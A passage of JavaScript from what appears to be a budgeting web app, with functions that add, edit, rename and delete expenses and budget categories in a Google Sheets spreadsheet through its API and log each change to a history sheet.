  await Promise.all(categories.map(async (cat) => {
    try {
      const rows = await fetchDetailRows(cat, accessToken, sheetId);
      rows.forEach(row => {
        (row.amounts || []).forEach(amt => {
          if (amt > 0) results.push({ vendor: row.description, amount: amt, category: cat });
        });
      });
    } catch { /* skip failed categories */ }
  }));
  return results;
}

// ─── Write ────────────────────────────────────────────────────────────────────

export async function addOrUpdateExpense(
  categoryName, vendorName, amount, accessToken, sheetId, monthName,
  source = 'manual', txDate = null,
) {
  if (!navigator.onLine) {
    enqueue({ type: 'add_expense', payload: { categoryName, vendorName, amount, monthName, source, txDate } });
    return { queued: true };
  }

  const config = getEffectiveSheetMap()[categoryName];
  if (!config) throw new Error(`Unknown category: ${categoryName}`);

  const values   = await fetchRaw(sheetId, config.sheet, accessToken);
  const dataRows = values.slice(1);
  const isV2     = detectV2(values);

  let month, year;
  if (monthName) {
    const parts = monthName.split(' ');
    month = parts[0];
    year  = parseInt(parts[1]) || new Date().getFullYear();
  } else {
    const now = new Date();
    month = now.toLocaleString('en-US', { month: 'short' });
    year  = now.getFullYear();
  }

  const newUUID = generateTransactionUUID(amount);

  if (isV2) {
    // v2: always insert a new row per transaction — no vendor grouping
    const dateVal  = txDate || todayIso();
    const descColV2 = 3;
    const amtColV2  = 4;
    const uuidColV2 = 5;

    let targetRow = -1;
    for (let i = 0; i < dataRows.length; i++) {
      const desc = dataRows[i][descColV2];
      const amt  = dataRows[i][amtColV2];
      if ((!desc || String(desc).trim() === '') && (!amt || String(amt).trim() === '')) {
        targetRow = i + 2;
        break;
      }
    }
    if (targetRow === -1) targetRow = dataRows.length + 2;

    const newRow = Array(uuidColV2 + 1).fill('');
    newRow[0]          = month;
    newRow[1]          = year;
    newRow[2]          = dateVal;
    newRow[descColV2]  = safeText(vendorName);
    newRow[amtColV2]   = amount;
    newRow[uuidColV2]  = newUUID;

    const range = encodeURIComponent(`'${config.sheet}'!A${targetRow}:${colLetter(uuidColV2)}${targetRow}`);
    await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ values: [newRow] }),
    });
    await appendHistoryEntry(sheetId, accessToken, {
      action: source === 'scan' ? 'Receipt Scan' : source === 'import' ? 'Import' : 'Added',
      category: categoryName, vendor: vendorName, amount, uuid: newUUID, txDate: dateVal,
    });
  } else {
    // v1: group by vendor in a single row, amounts as formula
    const uuidCol = uuidStart(config);

    let foundIndex = -1;
    for (let i = 0; i < dataRows.length; i++) {
      const desc = dataRows[i][config.descCol];
      if (desc && String(desc).trim().toLowerCase() === vendorName.trim().toLowerCase()) {
        foundIndex = i;
        break;
      }
    }

    if (foundIndex >= 0) {
      const sheetRow     = foundIndex + 2;
      const currentValue = dataRows[foundIndex][config.amtCol] ?? '';
      const existing     = parseAmounts(currentValue);
      await writeCell(sheetId, config.sheet, sheetRow, config.amtCol, buildFormula([...existing, amount]), accessToken);
      await writeCell(sheetId, config.sheet, sheetRow, uuidCol + existing.length, newUUID, accessToken);
      await appendHistoryEntry(sheetId, accessToken, {
        action: 'Updated', category: categoryName, vendor: vendorName, amount, uuid: newUUID,
      });
    } else {
      const newRow = Array(uuidCol + 1).fill('');
      newRow[0]              = month;
      newRow[1]              = year;
      newRow[config.descCol] = safeText(vendorName);
      newRow[config.amtCol]  = amount;
      newRow[uuidCol]        = newUUID;

      let targetRow = -1;
      for (let i = 0; i < dataRows.length; i++) {
        const desc = dataRows[i][config.descCol];
        const amt  = dataRows[i][config.amtCol];
        const hasDesc = desc && String(desc).trim() !== '';
        const hasAmt  = amt  && String(amt).trim()  !== '';
        if (!hasDesc && !hasAmt) { targetRow = i + 2; break; }
      }
      if (targetRow === -1) targetRow = dataRows.length + 2;

      const range = encodeURIComponent(`'${config.sheet}'!A${targetRow}:${colLetter(uuidCol)}${targetRow}`);
      await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
        method: 'PUT',
        headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ values: [newRow] }),
      });
      await appendHistoryEntry(sheetId, accessToken, {
        action: source === 'scan' ? 'Receipt Scan' : source === 'import' ? 'Import' : 'Added',
        category: categoryName, vendor: vendorName, amount, uuid: newUUID,
      });
    }
  }

  invalidateDetailCache(sheetId, categoryName);
}

export async function updateTransactionDate(categoryName, rowIndex, newDate, accessToken, sheetId) {
  const config = getEffectiveSheetMap()[categoryName];
  if (!config) throw new Error(`Unknown category: ${categoryName}`);
  await writeCell(sheetId, config.sheet, rowIndex, 2, newDate, accessToken); // col C = index 2
  invalidateDetailCache(sheetId, categoryName);
}

export async function updateVendorName(categoryName, rowIndex, newName, accessToken, sheetId, oldName = '', v2 = false) {
  const config   = getEffectiveSheetMap()[categoryName];
  if (!config) throw new Error(`Unknown category: ${categoryName}`);
  const descCol  = v2 ? 3 : config.descCol;
  await writeCell(sheetId, config.sheet, rowIndex, descCol, safeText(newName), accessToken);
  await appendHistoryEntry(sheetId, accessToken, {
    action: 'Renamed', category: categoryName, vendor: newName,
    details: oldName ? `${oldName} → ${newName}` : '',
  });
  invalidateDetailCache(sheetId, categoryName);
}

export async function updateVendorAmounts(
  categoryName, rowIndex, amounts, accessToken, sheetId, vendorName = '', previousTotal = null, uuids = [], v2 = false,
) {
  const config  = getEffectiveSheetMap()[categoryName];
  if (!config) throw new Error(`Unknown category: ${categoryName}`);
  const amtCol  = v2 ? 4 : config.amtCol;
  const uuidCol = v2 ? 5 : uuidStart(config);

  if (amounts.length === 0) {
    await clearRowRange(sheetId, config.sheet, rowIndex, uuidCol + 19, accessToken);
    await appendHistoryEntry(sheetId, accessToken, {
      action: 'Deleted', category: categoryName, vendor: vendorName,
      amount: previousTotal,
    });
  } else {
    await writeCell(sheetId, config.sheet, rowIndex, amtCol, v2 ? amounts[0] : buildFormula(amounts), accessToken);
    if (uuids.length > 0) {
      const maxCols   = Math.max(uuids.length + 2, 5);
      const uuidValues = Array(maxCols).fill('').map((_, i) => uuids[i] || '');
      const uuidRange  = encodeURIComponent(
        `'${config.sheet}'!${colLetter(uuidCol)}${rowIndex}:${colLetter(uuidCol + maxCols - 1)}${rowIndex}`
      );
      await apiFetch(sheetId, `/values/${uuidRange}?valueInputOption=RAW`, {
        method: 'PUT',
        headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ values: [uuidValues] }),
      });
    }
    const newTotal = amounts.reduce((a, b) => a + b, 0);
    await appendHistoryEntry(sheetId, accessToken, {
      action: 'Edited', category: categoryName, vendor: vendorName, amount: newTotal,
      details: previousTotal != null ? `was: $${previousTotal.toFixed(2)}` : '',
    });
  }
  invalidateDetailCache(sheetId, categoryName);
}

// ─── Delete a budget category ────────────────────────────────────────────────

export async function deleteCategory(sheetId, accessToken, { categoryName }) {
  // A category is custom if it is NOT in the static built-in map — reliable regardless of localStorage state
  const isCustom = !BUILT_IN_SHEET_MAP[categoryName];
  const effectiveMap = getEffectiveSheetMap();

  // 1. Find and clear the Totals row
  const range = encodeURIComponent("'Totals'!A2:C21");
  const json = await apiFetch(sheetId, `/values/${range}`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const rows = json.values || [];
  const rowIdx = rows.findIndex(r => (r[0] || '').toLowerCase() === categoryName.toLowerCase());
  if (rowIdx !== -1) {
    const rowNum = rowIdx + 2;
    const clearRange = encodeURIComponent(`'Totals'!A${rowNum}:C${rowNum}`);
    await apiFetch(sheetId, `/values/${clearRange}:clear`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}` },
    });
  }

  // 2. Handle detail sheet
  const config = effectiveMap[categoryName];
  if (isCustom && config) {
    // Custom: delete the entire sheet tab
    try {
      const meta = await apiFetch(sheetId, '?fields=sheets.properties', {
        headers: { Authorization: `Bearer ${accessToken}` },
      });
      const sheet = meta.sheets?.find(s => s.properties.title === config.sheet);
      if (sheet) {
        await apiFetch(sheetId, ':batchUpdate', {
          method: 'POST',
          headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            requests: [{ deleteSheet: { sheetId: sheet.properties.sheetId } }],
          }),
        });
      }
    } catch { /* non-fatal */ }
    removeCustomCategory(categoryName);
  } else if (!isCustom && config) {
    // Built-in: clear data rows but keep the sheet tab
    try {
      const clearDetail = encodeURIComponent(`'${config.sheet}'!A2:Z500`);
      await apiFetch(sheetId, `/values/${clearDetail}:clear`, {
        method: 'POST',
        headers: { Authorization: `Bearer ${accessToken}` },
      });
    } catch { /* non-fatal */ }
  }

  // 3. Remove from 50/30/20 sheet
  try {
    const S = '50/30/20';
    const s5 = await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!A1:H10`)}`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const s5rows = s5.values || [];
    const SCOLS = [{ d: 0, a: 1 }, { d: 3, a: 4 }, { d: 6, a: 7 }];
    for (const { d, a } of SCOLS) {
      for (let i = 1; i < s5rows.length; i++) {
        if ((s5rows[i]?.[d] || '').toLowerCase() === categoryName.toLowerCase()) {
          const r = i + 1;
          await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!${colLetter(d)}${r}:${colLetter(a)}${r}`)}:clear`, {
            method: 'POST',
            headers: { Authorization: `Bearer ${accessToken}` },
          });
          break;
        }
      }
    }
  } catch { /* non-fatal */ }

  // 4. Log to history
  await appendHistoryEntry(sheetId, accessToken, {
    action: 'Category Deleted',
    category: categoryName,
    details: isCustom ? 'Custom category and sheet deleted' : 'Category data cleared',
  });
}

// ─── Rename a budget category ─────────────────────────────────────────────────

export async function renameCategory(sheetId, accessToken, { oldName, newName }) {
  const isCustom  = !BUILT_IN_SHEET_MAP[oldName];
  const oldConfig = getEffectiveSheetMap()[oldName];

  // 1. Find the Totals row and update the name cell (A)
  const range = encodeURIComponent("'Totals'!A2:A21");
  const json = await apiFetch(sheetId, `/values/${range}`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const rows = json.values || [];
  const rowIdx = rows.findIndex(r => (r[0] || '').toLowerCase() === oldName.toLowerCase());
  if (rowIdx === -1) throw new Error(`Category "${oldName}" not found in Totals sheet.`);

  const rowNum = rowIdx + 2;
  await apiFetch(sheetId, `/values/${encodeURIComponent(`'Totals'!A${rowNum}`)}?valueInputOption=RAW`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [[newName]] }),
  });

  // 2. For custom categories: rename the detail sheet tab + fix Totals B formula
  if (isCustom && oldConfig) {
    try {
      const meta = await apiFetch(sheetId, '?fields=sheets.properties', {
        headers: { Authorization: `Bearer ${accessToken}` },
      });
      const tabSheet = meta.sheets?.find(s => s.properties.title === oldConfig.sheet);
      if (tabSheet) {
        // Rename the tab itself
        await apiFetch(sheetId, ':batchUpdate', {
          method: 'POST',
          headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            requests: [{ updateSheetProperties: {
              properties: { sheetId: tabSheet.properties.sheetId, title: newName },
              fields: 'title',
            }}],
          }),
        });
        // Re-point Totals B to the renamed tab
        await apiFetch(sheetId, `/values/${encodeURIComponent(`'Totals'!B${rowNum}`)}?valueInputOption=USER_ENTERED`, {
          method: 'PUT',
          headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ values: [[`='${escapeSheetRef(newName)}'!F1`]] }),
        });
      }
    } catch { /* non-fatal — tab rename best-effort */ }
  }

  // 3. Update localStorage so the new name maps to the right sheet config
  if (oldConfig) {
    const newSheet = isCustom ? newName : oldConfig.sheet; // custom tab was renamed; built-in tab stays same
    upsertCustomCategory(newName, { sheet: newSheet, descCol: oldConfig.descCol, amtCol: oldConfig.amtCol });
    removeCustomCategory(oldName);
  }

  // 4. Update 50/30/20 sheet — find old name and swap in new name + formula
  try {
    const S = '50/30/20';
    const s5 = await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!A1:H10`)}`, {
      headers: { Authorization: `Bearer ${accessToken}` },
    });
    const s5rows = s5.values || [];
    const SCOLS = [{ d: 0, a: 1 }, { d: 3, a: 4 }, { d: 6, a: 7 }];
    for (const { d, a } of SCOLS) {
      for (let i = 1; i < s5rows.length; i++) {
        if ((s5rows[i]?.[d] || '').toLowerCase() === oldName.toLowerCase()) {
          const r = i + 1;
          await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!${colLetter(d)}${r}`)}?valueInputOption=USER_ENTERED`, {
            method: 'PUT',
            headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ values: [[safeText(newName)]] }),
          });
          await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!${colLetter(a)}${r}`)}?valueInputOption=USER_ENTERED`, {
            method: 'PUT',
            headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ values: [[`=SUMIF(Totals!A:A,"${escapeFormulaString(newName)}",Totals!B:B)`]] }),
          });
          break;
        }
      }
    }
  } catch { /* non-fatal */ }

  // 5. Log to history
  await appendHistoryEntry(sheetId, accessToken, {
    action: 'Category Renamed',
    category: newName,
    details: `${oldName} → ${newName}`,
  });
}

// ─── Create detail sheet tab for a new category ──────────────────────────────

export async function createCategoryDetailSheet(sheetId, accessToken, { categoryName }) {
  // Create the new sheet tab
  await apiFetch(sheetId, ':batchUpdate', {
    method: 'POST',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({
      requests: [{ addSheet: { properties: { title: categoryName } } }],
    }),
  });

  // Write v2 headers: A=Month, B=Year, C=Date, D=Description, E=Amount
  const headerRange = encodeURIComponent(`'${categoryName}'!A1:E1`);
  await apiFetch(sheetId, `/values/${headerRange}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [['Month', 'Year', 'Date', 'Description', 'Amount']] }),
  });

  // Put the SUM total at F1 — Totals sheet references this cell
  const totalRange = encodeURIComponent(`'${categoryName}'!F1`);
  await apiFetch(sheetId, `/values/${totalRange}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [['=SUM(E2:E1000)']] }),
  });
}

// ─── Link Totals B column to the new detail sheet ────────────────────────────

export async function linkCategoryToDetailSheet(sheetId, accessToken, { categoryName }) {
  // Find the row in Totals for this category
  const range = encodeURIComponent("'Totals'!A2:A21");
  const json = await apiFetch(sheetId, `/values/${range}`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const rows = json.values || [];
  const rowIdx = rows.findIndex(r => (r[0] || '').toLowerCase() === categoryName.toLowerCase());
  if (rowIdx === -1) throw new Error(`Category "${categoryName}" not found in Totals sheet.`);

  const rowNum = rowIdx + 2;

  // Update B{rowNum} to pull from the detail sheet total cell F1
  const bRange = encodeURIComponent(`'Totals'!B${rowNum}`);
  await apiFetch(sheetId, `/values/${bRange}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [[`='${escapeSheetRef(categoryName)}'!F1`]] }),
  });
}

// ─── Add new category to 50/30/20 sheet ──────────────────────────────────────

export async function addCategoryTo503020(sheetId, accessToken, { categoryName, type }) {
  // Map type → 0-based column indices in the 50/30/20 sheet (A1:K…)
  const TYPE_COLS = {
    need:   { descCol: 0, amtCol: 1 }, // A, B
    want:   { descCol: 3, amtCol: 4 }, // D, E
    saving: { descCol: 6, amtCol: 7 }, // G, H
  };
  const cols = TYPE_COLS[type];
  if (!cols) return; // unknown type — skip silently

  const SHEET = '50/30/20';

  // Find the first empty slot in rows 2–10 of the relevant desc column
  const descColLetter = colLetter(cols.descCol);
  const range = encodeURIComponent(`'${SHEET}'!${descColLetter}2:${descColLetter}10`);
  const json = await apiFetch(sheetId, `/values/${range}`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const filled = json.values || [];
  if (filled.length >= 9) return; // all 9 slots used — skip silently

  const rowNum = filled.length + 2; // e.g. 3 filled → insert at row 5

  // Write category name
  const descCell = encodeURIComponent(`'${SHEET}'!${colLetter(cols.descCol)}${rowNum}`);
  await apiFetch(sheetId, `/values/${descCell}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [[safeText(categoryName)]] }),
  });

  // Write formula that pulls the actual spend from the Totals sheet
  const amtCell = encodeURIComponent(`'${SHEET}'!${colLetter(cols.amtCol)}${rowNum}`);
  await apiFetch(sheetId, `/values/${amtCell}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ values: [[`=SUMIF(Totals!A:A,"${escapeFormulaString(categoryName)}",Totals!B:B)`]] }),
  });
}

// ─── Add new budget category to Totals sheet ─────────────────────────────────

export async function addCategoryToTotals(sheetId, accessToken, { name, budget }) {
  // Read A2:A21 — only filled rows are returned, so length = next available slot
  const range = encodeURIComponent("'Totals'!A2:A21");
  const json = await apiFetch(sheetId, `/values/${range}`, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const filledRows = json.values || [];

  if (filledRows.length >= 20) {
    throw new Error('No empty rows available in the Totals sheet (rows 2–21 are full).');
  }

  const rowNum = filledRows.length + 2; // e.g. 14 filled rows → insert at row 16

  // Check for duplicate name
  const existing = filledRows.map(r => (r[0] || '').toLowerCase());
  if (existing.includes(name.toLowerCase())) {
    throw new Error(`A category named "${name}" already exists.`);
  }

  // Write: A=name, B=0 (no detail sheet yet), C=budget-B formula
  const writeRange = encodeURIComponent(`'Totals'!A${rowNum}:C${rowNum}`);
  await apiFetch(sheetId, `/values/${writeRange}?valueInputOption=USER_ENTERED`, {
    method: 'PUT',
    headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
    // budget is forced to Number so it can't be a string starting with =/+/etc.
    body: JSON.stringify({ values: [[safeText(name), 0, `=${Number(budget) || 0}-B${rowNum}`]] }),
  });

  return rowNum;
}
